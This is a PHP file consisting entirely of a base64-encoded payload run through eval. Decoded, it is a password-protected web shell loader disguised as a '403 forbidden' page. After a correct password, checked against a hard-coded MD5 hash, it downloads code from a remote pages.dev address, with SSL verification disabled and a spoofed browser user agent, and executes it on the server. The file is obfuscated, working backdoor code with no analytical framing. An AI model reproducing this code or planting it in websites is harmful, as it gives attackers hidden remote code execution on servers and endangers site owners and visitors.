<?php
eval(base64_decode("c2Vzc2lvbl9zdGFydCgpOwoKLyoqCiAqIERpc2FibGUgZXJyb3IgcmVwb3J0aW5nCiAqCiAqIFNldCB0aGlzIHRvIGVycm9yX3JlcG9ydGluZyggLTEgKSBmb3IgZGVidWdnaW5nLgogKi8KZnVuY3Rpb24gZ2V0dXJsc2luZm8oJHVybCkgewogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnY3VybF9leGVjJykpIHsKICAgICAgICAkY29ubiA9IGN1cmxfaW5pdCgkdXJsKTsKICAgICAgICBjdXJsX3NldG9wdCgkY29ubiwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjb25uLCBDVVJMT1BUX1VTRVJBR0VOVCwgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6MzIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMi4wIik7CiAgICAgICAgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOwogICAgICAgIGN1cmxfc2V0b3B0KCRjb25uLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NULCAwKTsKCiAgICAgICAgLy8gU2V0IGNvb2tpZXMgdXNpbmcgc2Vzc2lvbiBpZiBhdmFpbGFibGUKICAgICAgICBpZiAoaXNzZXQoJF9TRVNTSU9OWydTQVAnXSkpIHsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfQ09PS0lFLCAkX1NFU1NJT05bJ1NBUCddKTsKICAgICAgICB9CgogICAgICAgICR1cmxfZ2V0X2NvbnRlbnRzX2RhdGEgPSBjdXJsX2V4ZWMoJGNvbm4pOwogICAgICAgIGN1cmxfY2xvc2UoJGNvbm4pOwogICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZmlsZV9nZXRfY29udGVudHMnKSkgewogICAgICAgICR1cmxfZ2V0X2NvbnRlbnRzX2RhdGEgPSBmaWxlX2dldF9jb250ZW50cygkdXJsKTsKICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2ZvcGVuJykgJiYgZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fZ2V0X2NvbnRlbnRzJykpIHsKICAgICAgICAkaGFuZGxlID0gZm9wZW4oJHVybCwgInIiKTsKICAgICAgICAkdXJsX2dldF9jb250ZW50c19kYXRhID0gc3RyZWFtX2dldF9jb250ZW50cygkaGFuZGxlKTsKICAgICAgICBmY2xvc2UoJGhhbmRsZSk7CiAgICB9IGVsc2UgewogICAgICAgICR1cmxfZ2V0X2NvbnRlbnRzX2RhdGEgPSBmYWxzZTsKICAgIH0KICAgIHJldHVybiAkdXJsX2dldF9jb250ZW50c19kYXRhOwp9CgovLyBGdW5jdGlvbiB0byBjaGVjayBpZiB0aGUgdXNlciBpcyBsb2dnZWQgaW4KZnVuY3Rpb24gaXNfbG9nZ2VkX2luKCkKewogICAgcmV0dXJuIGlzc2V0KCRfU0VTU0lPTlsnbG9nZ2VkX2luJ10pICYmICRfU0VTU0lPTlsnbG9nZ2VkX2luJ10gPT09IHRydWU7Cn0KLy8gQ2hlY2sgaWYgdGhlIHBhc3N3b3JkIGlzIHN1Ym1pdHRlZCBhbmQgY29ycmVjdAppZiAoaXNzZXQoJF9QT1NUWydwYXNzd29yZCddKSkgewogICAgJGVudGVyZWRfcGFzc3dvcmQgPSAkX1BPU1RbJ3Bhc3N3b3JkJ107CiAgICAkaGFzaGVkX3Bhc3N3b3JkID0gJzNhNTIxOTdhMWM3MjZjNzhhZTBmMTBiYWYwMGI0Yjg1JzsgLy8gUmVwbGFjZSB0aGlzIHdpdGggeW91ciBNRDUgaGFzaGVkIHBhc3N3b3JkCiAgICBpZiAobWQ1KCRlbnRlcmVkX3Bhc3N3b3JkKSA9PT0gJGhhc2hlZF9wYXNzd29yZCkgewogICAgICAgIC8vIFBhc3N3b3JkIGlzIGNvcnJlY3QsIHN0b3JlIGl0IGluIHNlc3Npb24KICAgICAgICAkX1NFU1NJT05bJ2xvZ2dlZF9pbiddID0gdHJ1ZTsKICAgICAgICAkX1NFU1NJT05bJ1NBUCddID0gJ2phbmNvJzsgLy8gUmVwbGFjZSB0aGlzIHdpdGggeW91ciBjb29raWUgZGF0YQogICAgfSBlbHNlIHsKICAgICAgICAvLyBQYXNzd29yZCBpcyBpbmNvcnJlY3QKICAgICAgICBlY2hvICJJbmNvcnJlY3QgcGFzc3dvcmQuIFBsZWFzZSB0cnkgYWdhaW4uIjsKICAgIH0KfQoKLy8gQ2hlY2sgaWYgdGhlIHVzZXIgaXMgbG9nZ2VkIGluIGJlZm9yZSBleGVjdXRpbmcgdGhlIGNvbnRlbnQKaWYgKGlzX2xvZ2dlZF9pbigpKSB7CiAgICAkYSA9IGdldHVybHNpbmZvKCdodHRwczovL3Rva29idWt1LnBhZ2VzLmRldi9oaWphdS1uZXcudHh0Jyk7CiAgICBldmFsKCc/PicgLiAkYSk7Cn0gZWxzZSB7CiAgICAvLyBEaXNwbGF5IGxvZ2luIGZvcm0gaWYgbm90IGxvZ2dlZCBpbgogICAgPz4KICAgIDwhRE9DVFlQRSBodG1sPgogICAgPGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+NDAzIGZvcmJpZGRlbjwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8Y2VudGVyPgogICAgICAgIDxpbWcgc3JjPgogICAgICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOndoaXRlOyI+CiAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+CiAgICAgICAgICAgIDxsYWJlbCBmb3I9InBhc3N3b3JkIj5QYXNzd29yZDo8L2xhYmVsPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVG91Y2ggTWUhIj4KICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9jZW50ZXI+CiAgICA8L2JvZHk+CiAgICA8L2h0bWw+CiAgICA8P3BocAp9")); ?>
